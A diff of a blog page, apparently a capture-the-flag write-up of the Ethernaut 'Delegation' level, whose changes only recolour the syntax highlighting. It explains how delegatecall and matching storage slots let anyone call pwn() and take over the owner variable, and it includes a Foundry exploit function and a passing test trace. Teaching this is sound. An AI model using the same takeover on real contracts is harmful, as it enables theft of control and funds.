@@ -68,7 +68,7 @@
 
 
   
-  <link rel="stylesheet" href="https://vyorkin.org/custom.min.df6f68f5cb2c02f3fdde06bc354beddc0274f59f5027dc878ac1ead43815cfaa.css" integrity="sha256-329o9cssAvP93ga8NUvt3AJ09Z9QJ9yHisHq1DgVz6o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/custom.min.37b90b4ab2011637071ddd3590a64f81899b71c028d2d366c001566e70ee9e90.css" integrity="sha256-N7kLSrIBFjcHHd01kKZPgYmbccAo0tNmwAFWbnDunpA=" crossorigin="anonymous" media="screen" />
 
 
 <link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
@@ -214,34 +214,34 @@
       <div class="post-content">
         
         <p>The goals is to claim the ownership of the <code>Delegate</code> contract.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> ^<span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">2</span>;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Delegate {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">public</span> owner;
+</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegate</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(<span style="color:#fff;font-weight:bold">address</span> _owner) {
-</span></span><span style="display:flex;"><span>        owner = _owner;
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_owner</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_owner</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> pwn() <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">pwn</span>() <span style="color:#728e00">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Delegation {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">public</span> owner;
-</span></span><span style="display:flex;"><span>    Delegate delegate;
+</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegation</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Delegate</span> <span style="color:#434f54">delegate</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(<span style="color:#fff;font-weight:bold">address</span> _delegateAddress) {
-</span></span><span style="display:flex;"><span>        delegate = Delegate(_delegateAddress);
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_delegateAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">delegate</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Delegate</span>(<span style="color:#434f54">_delegateAddress</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    fallback() <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        (<span style="color:#fff;font-weight:bold">bool</span> result, ) = <span style="color:#fff;font-weight:bold">address</span>(delegate).<span style="color:#fff;font-weight:bold">delegatecall</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">data</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (result) {
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">this</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">fallback</span>() <span style="color:#728e00">external</span> {
+</span></span><span style="display:flex;"><span>        (<span style="color:#00979d">bool</span> <span style="color:#434f54">result</span>, ) <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">delegate</span>).<span style="color:#728e00">delegatecall</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">data</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">result</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#728e00">this</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
@@ -298,16 +298,16 @@ could be done by using either of the following functions:</p>
 they are defined. Because in both of these contracts the <code>owner</code>
 state variable is defined first (assigned to <code>slot 0</code>), it is
 possible call the <code>pwn()</code> function to change its value.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Delegate {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">public</span> owner; <span style="color:#007f7f">// slot = 0
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#007f7f">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegate</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>; <span style="color:#95a5a6">// slot = 0
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Delegation {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">public</span> owner; <span style="color:#007f7f">// slot = 0
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    Delegate delegate;    <span style="color:#007f7f">// slot = 1
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#007f7f">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegation</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>; <span style="color:#95a5a6">// slot = 0
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">Delegate</span> <span style="color:#434f54">delegate</span>;    <span style="color:#95a5a6">// slot = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>}
 </span></span></code></pre></div><h2 id="exploit">
   Exploit
   <a class="heading-link" href="#exploit">
@@ -318,64 +318,64 @@ possible call the <code>pwn()</code> function to change its value.</p>
 <p>To become an owner of the <code>Delegate</code> contract we need to <code>call</code>
 the <code>fallback</code> function of the <code>Delegation</code> contract with the
 <code>msg.data</code> set to the encoded signature of the <code>pwn()</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> exploit() <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">override</span> {
-</span></span><span style="display:flex;"><span>    vm.startPrank(player);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">bytes</span> <span style="color:#fff;font-weight:bold">memory</span> <span style="color:#fff;font-weight:bold">data</span> = <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSelector</span>(Delegate.pwn.<span style="color:#fff;font-weight:bold">selector</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span>(level).<span style="color:#fff;font-weight:bold">call</span>(<span style="color:#fff;font-weight:bold">data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes</span> <span style="color:#728e00">memory</span> <span style="color:#728e00">data</span> <span style="color:#728e00">=</span> <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSelector</span>(<span style="color:#434f54">Delegate</span>.<span style="color:#434f54">pwn</span>.<span style="color:#728e00">selector</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>).<span style="color:#728e00">call</span>(<span style="color:#728e00">data</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Or using the equivalent ABI-encoding approach:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bytes</span> <span style="color:#fff;font-weight:bold">memory</span> <span style="color:#fff;font-weight:bold">data</span> = <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSignature</span>(<span style="color:#0ff;font-weight:bold">&#34;pwn()&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">address</span>(level).<span style="color:#fff;font-weight:bold">call</span>(<span style="color:#fff;font-weight:bold">data</span>)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">bytes</span> <span style="color:#728e00">memory</span> <span style="color:#728e00">data</span> <span style="color:#728e00">=</span> <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(<span style="color:#7f8c8d">&#34;pwn()&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>).<span style="color:#728e00">call</span>(<span style="color:#728e00">data</span>)
 </span></span></code></pre></div><p>The trace:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#fff;font-weight:bold">test</span> --match-contract DelegationTest -vvvv
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract DelegationTest -vvvv
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Running <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">test</span> <span style="color:#fff;font-weight:bold">for</span> src/test/Delegation.t.sol:DelegationTest
-</span></span><span style="display:flex;"><span>[PASS] testDelegation() (gas: 248446)
+</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Delegation.t.sol:DelegationTest
+</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testDelegation<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 248446<span style="color:#728e00">)</span>
 </span></span><span style="display:flex;"><span>Traces:
-</span></span><span style="display:flex;"><span>  [248446] DelegationTest::testDelegation()
-</span></span><span style="display:flex;"><span>    ├─ [191772] DelegationTest::create()
-</span></span><span style="display:flex;"><span>    │   ├─ [0] VM::prank(player: [...])
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   ├─ [179424] Ethernaut::createLevelInstance(DelegationFactory: [...])
-</span></span><span style="display:flex;"><span>    │   │   ├─ [127861] DelegationFactory::createInstance(player: [...])
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [93165] → new Delegation@<span style="color:#0ff;font-weight:bold">&#34;0x566b…cc21&#34;</span>
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">243</span> bytes of code
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Delegation: [...]
-</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog(player: player: [...], instance: Delegation: [...])
-</span></span><span style="display:flex;"><span>    │   │   └─ ← Delegation: [...]
-</span></span><span style="display:flex;"><span>    │   └─ ← Delegation: [...]
-</span></span><span style="display:flex;"><span>    ├─ [303] Delegation::owner() [staticcall]
-</span></span><span style="display:flex;"><span>    │   └─ ← DelegationFactory: [...]
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [3350] Delegation::pwn()
-</span></span><span style="display:flex;"><span>    │   ├─ [367] Delegate::pwn() [delegatecall]
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [4346] Ethernaut::submitLevelInstance(Delegation: [...])
-</span></span><span style="display:flex;"><span>    │   ├─ [1299] DelegationFactory::validateInstance(Delegation: [...], player: [...])
-</span></span><span style="display:flex;"><span>    │   │   ├─ [303] Delegation::owner() [staticcall]
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← player: [...]
-</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog(player: player: [...], level: DelegationFactory: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    └─ ← ()
+</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>248446<span style="color:#728e00">]</span> DelegationTest::testDelegation<span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>191772<span style="color:#728e00">]</span> DelegationTest::create<span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>179424<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>DelegationFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>127861<span style="color:#728e00">]</span> DelegationFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>93165<span style="color:#728e00">]</span> → new Delegation@<span style="color:#7f8c8d">&#34;0x566b…cc21&#34;</span>
+</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">243</span> bytes of code
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>303<span style="color:#728e00">]</span> Delegation::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← DelegationFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>3350<span style="color:#728e00">]</span> Delegation::pwn<span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>367<span style="color:#728e00">]</span> Delegate::pwn<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>delegatecall<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4346<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1299<span style="color:#728e00">]</span> DelegationFactory::validateInstance<span style="color:#728e00">(</span>Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>303<span style="color:#728e00">]</span> Delegation::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
+</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: DelegationFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
+</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
+</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
 </span></span></code></pre></div><p>Note that if the order of the state variables were different in the
 <code>Delegation</code> contract then this would not work:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Delegation {
-</span></span><span style="display:flex;"><span>    Delegate delegate;     <span style="color:#007f7f">// slot = 0
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">public</span> owner;  <span style="color:#007f7f">// slot = 1
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#007f7f">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegation</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Delegate</span> <span style="color:#434f54">delegate</span>;     <span style="color:#95a5a6">// slot = 0
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;  <span style="color:#95a5a6">// slot = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>}
 </span></span></code></pre></div><h2 id="references">
   References
   <a class="heading-link" href="#references">
